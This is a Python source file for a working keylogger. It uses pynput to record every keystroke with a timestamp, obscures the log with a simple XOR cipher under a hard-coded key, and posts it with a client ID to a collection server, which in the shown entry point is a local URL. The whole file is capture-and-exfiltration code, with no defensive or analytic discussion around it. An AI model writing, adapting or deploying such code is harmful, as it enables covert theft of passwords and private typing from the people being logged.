from abc import ABC, abstractmethod
from pynput import keyboard
import requests
import json
from datetime import datetime
import uuid


class XOREncryptor:
    def __init__(self, key: str):
        self.key = key

    def encrypt(self, data: str) -> str:
        return ''.join(
            chr(ord(c) ^ ord(self.key[i % len(self.key)]))
            for i, c in enumerate(data)
        )

# --- Keylogger interface ---
class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self): pass
    @abstractmethod
    def stop_logging(self): pass
    @abstractmethod
    def get_logged_keys(self): pass

# --- Managing data---
class KeyLoggerManager:
    def __init__(self, server_url: str):
        self.logged_keys = []
        self.server_url = server_url
        self.encryptor = XOREncryptor("mysecretkey")
        self.client_id = str(uuid.uuid4())

    def handle_key(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)
        timestamp = datetime.now().isoformat()
        self.logged_keys.append({"key": key_str, "time": timestamp})
        print(f"[LOGGED] {key_str}")

    def stop_and_send(self):
        if not self.logged_keys:
            print("[INFO] No keys to send.")
            return
        data_json = json.dumps(self.logged_keys)
        encrypted = self.encryptor.encrypt(data_json)
        try:
            response = requests.post(
                self.server_url,
                json={"data": encrypted, "client_id": self.client_id}
            )
            if response.status_code == 200:
                print("[INFO] Data sent successfully.")
            else:
                print(f"[WARN] Server returned {response.status_code}")
        except Exception as e:
            print(f"[ERROR] Failed to send data: {e}")

# --- Service ---
class KeyLoggerService(IKeyLogger):
    def __init__(self, manager):
        self.manager = manager
        self.listener = None

    def start_logging(self):
        def on_press(key):
            if key == keyboard.Key.esc:
                print("[INFO] ESC pressed. Stopping keylogger...")
                return False  # stop listener
            self.manager.handle_key(key)

        self.listener = keyboard.Listener(on_press=on_press)
        self.listener.start()
        self.listener.join()  

    def stop_logging(self):
        if self.listener:
            self.listener.stop()

    def get_logged_keys(self):
        return self.manager.logged_keys

# --- Entry point ---
if __name__ == "__main__":
    manager = KeyLoggerManager("http://127.0.0.1:5000/log")
    service = KeyLoggerService(manager)
    service.start_logging() 
    manager.stop_and_send()  
    print("Keylogger stopped and data sent.")
